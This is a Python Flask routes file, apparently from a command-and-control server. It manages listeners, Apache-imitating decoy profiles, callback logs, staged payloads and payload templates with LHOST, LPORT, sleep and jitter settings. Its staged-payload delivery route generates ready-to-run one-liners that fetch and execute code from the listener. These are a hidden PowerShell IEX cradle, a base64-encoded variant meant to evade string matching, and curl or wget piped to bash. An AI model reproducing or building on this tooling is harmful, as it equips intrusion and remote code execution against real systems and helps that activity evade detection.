"""
Listener management API routes — CRUD, lifecycle, profiles, callbacks, staged payloads.

All endpoints require JWT auth; most require admin role.
"""

import base64
import hashlib
import json
import logging
from datetime import datetime, timezone, timedelta

from flask import Blueprint, request, jsonify, current_app
from flask_jwt_extended import jwt_required, get_jwt, get_jwt_identity

from models import (
    db, Role, Listener, ListenerProfile, Callback, StagedPayload, AuditLog,
)
from payload_templates import list_templates, get_template, render_template

logger = logging.getLogger(__name__)
listeners_bp = Blueprint('listeners', __name__, url_prefix='/api/listeners')


def _utcnow():
    return datetime.now(timezone.utc)


def _require_admin():
    if get_jwt().get('role') != Role.ADMIN:
        return jsonify({"error": "Admin access required"}), 403
    return None


# ═══════════════════════════════════════════════════════════════════════════
# Listener CRUD
# ═══════════════════════════════════════════════════════════════════════════

@listeners_bp.route('', methods=['GET'])
@jwt_required()
def list_listeners():
    """List all configured listeners with runtime status."""
    mgr = current_app.extensions.get('listener_manager')
    listeners = Listener.query.order_by(Listener.created_at.desc()).all()
    result = []
    for lsn in listeners:
        d = lsn.to_dict()
        if mgr:
            rt = mgr.get_status(lsn.id)
            d['runtime'] = rt
        result.append(d)
    return jsonify(result), 200


@listeners_bp.route('', methods=['POST'])
@jwt_required()
def create_listener():
    """Create a new listener configuration."""
    err = _require_admin()
    if err:
        return err

    data = request.get_json(silent=True) or {}
    name = str(data.get('name', '')).strip()
    if not name:
        return jsonify({"error": "name is required"}), 400

    if Listener.query.filter_by(name=name).first():
        return jsonify({"error": "Name already exists"}), 409

    bind_port = data.get('bind_port')
    if not bind_port or not isinstance(bind_port, int) or bind_port < 1 or bind_port > 65535:
        return jsonify({"error": "Valid bind_port (1-65535) required"}), 400

    listener = Listener(
        name=name,
        listener_type=str(data.get('listener_type', 'http'))[:32],
        bind_address=str(data.get('bind_address', '0.0.0.0'))[:45],
        bind_port=bind_port,
        tls_cert_path=data.get('tls_cert_path'),
        tls_key_path=data.get('tls_key_path'),
        profile_id=data.get('profile_id'),
        created_by=get_jwt_identity(),
        status='stopped',
    )
    db.session.add(listener)
    db.session.commit()
    return jsonify(listener.to_dict()), 201


@listeners_bp.route('/<int:lid>', methods=['GET'])
@jwt_required()
def get_listener(lid):
    listener = db.session.get(Listener, lid)
    if not listener:
        return jsonify({"error": "Not found"}), 404
    d = listener.to_dict()
    mgr = current_app.extensions.get('listener_manager')
    if mgr:
        d['runtime'] = mgr.get_status(lid)
    return jsonify(d), 200


@listeners_bp.route('/<int:lid>', methods=['PUT'])
@jwt_required()
def update_listener(lid):
    err = _require_admin()
    if err:
        return err

    listener = db.session.get(Listener, lid)
    if not listener:
        return jsonify({"error": "Not found"}), 404
    if listener.status == 'running':
        return jsonify({"error": "Stop the listener before editing"}), 409

    data = request.get_json(silent=True) or {}
    for field in ('name', 'listener_type', 'bind_address', 'tls_cert_path', 'tls_key_path'):
        if field in data:
            setattr(listener, field, str(data[field])[:512] if data[field] else None)
    if 'bind_port' in data:
        port = data['bind_port']
        if isinstance(port, int) and 1 <= port <= 65535:
            listener.bind_port = port
    if 'profile_id' in data:
        listener.profile_id = data['profile_id']

    db.session.commit()
    return jsonify(listener.to_dict()), 200


@listeners_bp.route('/<int:lid>', methods=['DELETE'])
@jwt_required()
def delete_listener(lid):
    err = _require_admin()
    if err:
        return err

    listener = db.session.get(Listener, lid)
    if not listener:
        return jsonify({"error": "Not found"}), 404
    if listener.status == 'running':
        return jsonify({"error": "Stop the listener before deleting"}), 409

    # Cascade: remove callbacks, staged payloads
    Callback.query.filter_by(listener_id=lid).delete()
    StagedPayload.query.filter_by(listener_id=lid).delete()
    db.session.delete(listener)
    db.session.commit()
    return jsonify({"message": "Listener deleted"}), 200


# ═══════════════════════════════════════════════════════════════════════════
# Lifecycle Control
# ═══════════════════════════════════════════════════════════════════════════

@listeners_bp.route('/<int:lid>/start', methods=['POST'])
@jwt_required()
def start_listener(lid):
    err = _require_admin()
    if err:
        return err

    mgr = current_app.extensions.get('listener_manager')
    if not mgr:
        return jsonify({"error": "ListenerManager not available"}), 500

    result = mgr.start_listener(lid)
    status_code = 200 if result.get('ok') else 400
    return jsonify(result), status_code


@listeners_bp.route('/<int:lid>/stop', methods=['POST'])
@jwt_required()
def stop_listener(lid):
    err = _require_admin()
    if err:
        return err

    mgr = current_app.extensions.get('listener_manager')
    if not mgr:
        return jsonify({"error": "ListenerManager not available"}), 500

    result = mgr.stop_listener(lid)
    return jsonify(result), 200


@listeners_bp.route('/<int:lid>/restart', methods=['POST'])
@jwt_required()
def restart_listener(lid):
    err = _require_admin()
    if err:
        return err

    mgr = current_app.extensions.get('listener_manager')
    if not mgr:
        return jsonify({"error": "ListenerManager not available"}), 500

    result = mgr.restart_listener(lid)
    status_code = 200 if result.get('ok') else 400
    return jsonify(result), status_code


# ═══════════════════════════════════════════════════════════════════════════
# Listener Profiles
# ═══════════════════════════════════════════════════════════════════════════

@listeners_bp.route('/profiles', methods=['GET'])
@jwt_required()
def list_profiles():
    profiles = ListenerProfile.query.order_by(ListenerProfile.name).all()
    return jsonify([p.to_dict() for p in profiles]), 200


@listeners_bp.route('/profiles', methods=['POST'])
@jwt_required()
def create_profile():
    err = _require_admin()
    if err:
        return err

    data = request.get_json(silent=True) or {}
    name = str(data.get('name', '')).strip()
    if not name:
        return jsonify({"error": "name required"}), 400

    if ListenerProfile.query.filter_by(name=name).first():
        return jsonify({"error": "Profile name exists"}), 409

    custom_headers = data.get('custom_headers', {})
    if isinstance(custom_headers, dict):
        custom_headers = json.dumps(custom_headers)

    profile = ListenerProfile(
        name=name,
        description=str(data.get('description', ''))[:1000],
        server_header=str(data.get('server_header', 'Apache/2.4.54 (Ubuntu)'))[:256],
        custom_headers=custom_headers,
        default_response_body=str(data.get('default_response_body', '<html><body><h1>It works!</h1></body></html>'))[:10000],
        default_content_type=str(data.get('default_content_type', 'text/html'))[:128],
        created_by=get_jwt_identity(),
    )
    db.session.add(profile)
    db.session.commit()
    return jsonify(profile.to_dict()), 201


@listeners_bp.route('/profiles/<int:pid>', methods=['PUT'])
@jwt_required()
def update_profile(pid):
    err = _require_admin()
    if err:
        return err

    profile = db.session.get(ListenerProfile, pid)
    if not profile:
        return jsonify({"error": "Not found"}), 404

    data = request.get_json(silent=True) or {}
    for field in ('name', 'description', 'server_header', 'default_response_body', 'default_content_type'):
        if field in data:
            setattr(profile, field, str(data[field])[:10000])
    if 'custom_headers' in data:
        ch = data['custom_headers']
        profile.custom_headers = json.dumps(ch) if isinstance(ch, dict) else str(ch)

    db.session.commit()
    return jsonify(profile.to_dict()), 200


@listeners_bp.route('/profiles/<int:pid>', methods=['DELETE'])
@jwt_required()
def delete_profile(pid):
    err = _require_admin()
    if err:
        return err

    profile = db.session.get(ListenerProfile, pid)
    if not profile:
        return jsonify({"error": "Not found"}), 404

    # Un-assign from any listeners
    Listener.query.filter_by(profile_id=pid).update({'profile_id': None})
    db.session.delete(profile)
    db.session.commit()
    return jsonify({"message": "Profile deleted"}), 200


# ═══════════════════════════════════════════════════════════════════════════
# Callbacks
# ═══════════════════════════════════════════════════════════════════════════

@listeners_bp.route('/callbacks', methods=['GET'])
@jwt_required()
def list_callbacks():
    """List callbacks, paginated. Filter by listener_id, ip, method, path."""
    page = request.args.get('page', 1, type=int)
    per_page = min(request.args.get('per_page', 50, type=int), 200)

    query = Callback.query

    lid = request.args.get('listener_id', type=int)
    if lid:
        query = query.filter_by(listener_id=lid)

    ip = request.args.get('ip')
    if ip:
        query = query.filter_by(source_ip=ip)

    method = request.args.get('method')
    if method:
        query = query.filter_by(request_method=method.upper())

    search = request.args.get('search')
    if search:
        like = f"%{search}%"
        query = query.filter(
            db.or_(
                Callback.request_path.ilike(like),
                Callback.user_agent.ilike(like),
                Callback.source_ip.ilike(like),
            )
        )

    pagination = query.order_by(Callback.timestamp.desc()).paginate(
        page=page, per_page=per_page, error_out=False
    )

    return jsonify({
        "callbacks": [c.to_dict() for c in pagination.items],
        "total": pagination.total,
        "pages": pagination.pages,
        "current_page": page,
    }), 200


@listeners_bp.route('/callbacks/<int:cid>', methods=['GET'])
@jwt_required()
def get_callback(cid):
    cb = db.session.get(Callback, cid)
    if not cb:
        return jsonify({"error": "Not found"}), 404
    return jsonify(cb.to_dict()), 200


@listeners_bp.route('/callbacks', methods=['DELETE'])
@jwt_required()
def delete_callbacks():
    """Bulk delete callbacks. Optional: older_than_days, listener_id."""
    err = _require_admin()
    if err:
        return err

    query = Callback.query
    days = request.args.get('older_than_days', type=int)
    if days and days > 0:
        cutoff = _utcnow() - timedelta(days=days)
        query = query.filter(Callback.timestamp < cutoff)

    lid = request.args.get('listener_id', type=int)
    if lid:
        query = query.filter_by(listener_id=lid)

    num = query.delete(synchronize_session=False)
    db.session.commit()
    return jsonify({"deleted": num}), 200


# ═══════════════════════════════════════════════════════════════════════════
# Staged Payloads
# ═══════════════════════════════════════════════════════════════════════════

@listeners_bp.route('/<int:lid>/staged', methods=['GET'])
@jwt_required()
def list_staged(lid):
    payloads = StagedPayload.query.filter_by(listener_id=lid).order_by(StagedPayload.created_at.desc()).all()
    return jsonify([p.to_dict() for p in payloads]), 200


@listeners_bp.route('/<int:lid>/staged', methods=['POST'])
@jwt_required()
def create_staged(lid):
    err = _require_admin()
    if err:
        return err

    listener = db.session.get(Listener, lid)
    if not listener:
        return jsonify({"error": "Listener not found"}), 404

    data = request.get_json(silent=True) or {}
    content = str(data.get('content', ''))
    if not content:
        return jsonify({"error": "content required"}), 400

    stage_path = str(data.get('stage_path', '')).strip()
    if not stage_path or not stage_path.startswith('/'):
        return jsonify({"error": "stage_path must start with /"}), 400

    # Check uniqueness on this listener
    if StagedPayload.query.filter_by(listener_id=lid, stage_path=stage_path).first():
        return jsonify({"error": "stage_path already in use on this listener"}), 409

    sp = StagedPayload(
        name=str(data.get('name', stage_path))[:128],
        listener_id=lid,
        payload_type=str(data.get('payload_type', 'raw'))[:32],
        content=content,
        content_hash=hashlib.sha256(content.encode()).hexdigest(),
        stage_path=stage_path[:256],
        is_active=data.get('is_active', True),
        created_by=get_jwt_identity(),
    )
    db.session.add(sp)
    db.session.commit()
    return jsonify(sp.to_dict()), 201


@listeners_bp.route('/<int:lid>/staged/<int:sid>/delivery', methods=['GET'])
@jwt_required()
def get_staged_delivery(lid, sid):
    """Generate ready-to-use delivery one-liners for a staged payload."""
    sp = StagedPayload.query.filter_by(id=sid, listener_id=lid).first()
    if not sp:
        return jsonify({"error": "Not found"}), 404

    listener = sp.listener
    
    # Determine external reachability
    host = listener.bind_address
    if host == '0.0.0.0':
        # Best guess: use the API request's host if listener is on all interfaces
        host = request.host.split(':')[0]
    
    scheme = listener.listener_type
    port = listener.bind_port
    
    # Construct the raw URL for the payload
    base_url = f"{scheme}://{host}:{port}"
    raw_url = f"{base_url}{sp.stage_path}"
    
    # PowerShell IEX Cradle
    iex_cradle = f"IEX (New-Object Net.WebClient).DownloadString('{raw_url}')"
    # Base64 Encode (UTF-16LE for Windows)
    b64_cradle = base64.b64encode(iex_cradle.encode('utf-16-le')).decode()

    commands = [
        {
            "technique": "PowerShell (In-Memory)",
            "description": "Standard download cradle. Executes payload in memory.",
            "platform": "Windows",
            "cmd": f"powershell -nop -w hidden -c \"{iex_cradle}\"",
        },
        {
            "technique": "PowerShell (Base64 Encoded)",
            "description": "Encoded cradle to bypass simple string matching.",
            "platform": "Windows",
            "cmd": f"powershell -nop -w hidden -enc {b64_cradle}",
        },
        {
            "technique": "Curl (Linux/Bash)",
            "description": "Pipe to bash for immediate execution.",
            "platform": "Linux",
            "cmd": f"curl -sSL '{raw_url}' | bash",
        },
        {
            "technique": "Wget (Linux/Bash)",
            "description": "Download and execute.",
            "platform": "Linux",
            "cmd": f"wget -qO- '{raw_url}' | bash",
        }
    ]

    return jsonify({
        "raw_url": raw_url,
        "commands": commands
    }), 200


@listeners_bp.route('/<int:lid>/staged/<int:sid>', methods=['PUT'])
@jwt_required()
def update_staged(lid, sid):
    err = _require_admin()
    if err:
        return err

    sp = StagedPayload.query.filter_by(id=sid, listener_id=lid).first()
    if not sp:
        return jsonify({"error": "Not found"}), 404

    data = request.get_json(silent=True) or {}
    if 'content' in data:
        sp.content = str(data['content'])
        sp.content_hash = hashlib.sha256(sp.content.encode()).hexdigest()
    if 'name' in data:
        sp.name = str(data['name'])[:128]
    if 'is_active' in data:
        sp.is_active = bool(data['is_active'])
    if 'stage_path' in data:
        new_path = str(data['stage_path']).strip()
        if new_path.startswith('/'):
            existing = StagedPayload.query.filter_by(listener_id=lid, stage_path=new_path).first()
            if existing and existing.id != sid:
                return jsonify({"error": "stage_path already in use"}), 409
            sp.stage_path = new_path[:256]

    db.session.commit()
    return jsonify(sp.to_dict()), 200


@listeners_bp.route('/<int:lid>/staged/<int:sid>', methods=['DELETE'])
@jwt_required()
def delete_staged(lid, sid):
    err = _require_admin()
    if err:
        return err

    sp = StagedPayload.query.filter_by(id=sid, listener_id=lid).first()
    if not sp:
        return jsonify({"error": "Not found"}), 404

    db.session.delete(sp)
    db.session.commit()
    return jsonify({"message": "Staged payload deleted"}), 200


# ═══════════════════════════════════════════════════════════════════════════
# Payload Templates
# ═══════════════════════════════════════════════════════════════════════════

@listeners_bp.route('/templates', methods=['GET'])
@jwt_required()
def get_templates():
    """List all available payload templates (metadata only)."""
    return jsonify(list_templates()), 200


@listeners_bp.route('/templates/<template_id>', methods=['GET'])
@jwt_required()
def get_template_detail(template_id):
    """Get a single template including its raw content."""
    tpl = get_template(template_id)
    if not tpl:
        return jsonify({"error": "Template not found"}), 404
    return jsonify(tpl), 200


@listeners_bp.route('/templates/<template_id>/render', methods=['POST'])
@jwt_required()
def render_payload_template(template_id):
    """
    Render a template with provided parameters.

    Body (JSON):
      { "LHOST": "...", "LPORT": ..., "SLEEP": ..., "JITTER": ..., "STAGE_PATH": "...", "SCHEME": "http|https" }
    """
    data = request.get_json(silent=True) or {}
    result = render_template(template_id, data)
    if not result:
        return jsonify({"error": "Template not found"}), 404
    return jsonify(result), 200


@listeners_bp.route('/<int:lid>/staged/from-template', methods=['POST'])
@jwt_required()
def create_staged_from_template(lid):
    """
    Generate and stage a payload from a template in one step.

    Body (JSON):
      { "template_id": "...", "LHOST": "...", "LPORT": ..., ... , "stage_path": "/...", "name": "..." }
    """
    err = _require_admin()
    if err:
        return err

    listener = db.session.get(Listener, lid)
    if not listener:
        return jsonify({"error": "Listener not found"}), 404

    data = request.get_json(silent=True) or {}
    template_id = str(data.get('template_id', ''))
    if not template_id:
        return jsonify({"error": "template_id required"}), 400

    # Auto-fill LHOST and LPORT from listener if not provided
    params = dict(data)
    if 'LHOST' not in params:
        params['LHOST'] = listener.bind_address if listener.bind_address != '0.0.0.0' else '127.0.0.1'
    if 'LPORT' not in params:
        params['LPORT'] = listener.bind_port
    if 'SCHEME' not in params:
        params['SCHEME'] = listener.listener_type  # http or https

    rendered = render_template(template_id, params)
    if not rendered:
        return jsonify({"error": "Template not found"}), 404

    stage_path = str(data.get('stage_path', rendered['default_stage_path'])).strip()
    if not stage_path.startswith('/'):
        stage_path = '/' + stage_path

    # Check uniqueness
    if StagedPayload.query.filter_by(listener_id=lid, stage_path=stage_path).first():
        return jsonify({"error": "stage_path already in use on this listener"}), 409

    content = rendered['content']
    sp = StagedPayload(
        name=str(data.get('name', rendered['name']))[:128],
        listener_id=lid,
        payload_type=rendered['payload_type'],
        content=content,
        content_hash=hashlib.sha256(content.encode()).hexdigest(),
        stage_path=stage_path[:256],
        is_active=data.get('is_active', True),
        created_by=get_jwt_identity(),
    )
    db.session.add(sp)
    db.session.commit()
    return jsonify(sp.to_dict()), 201
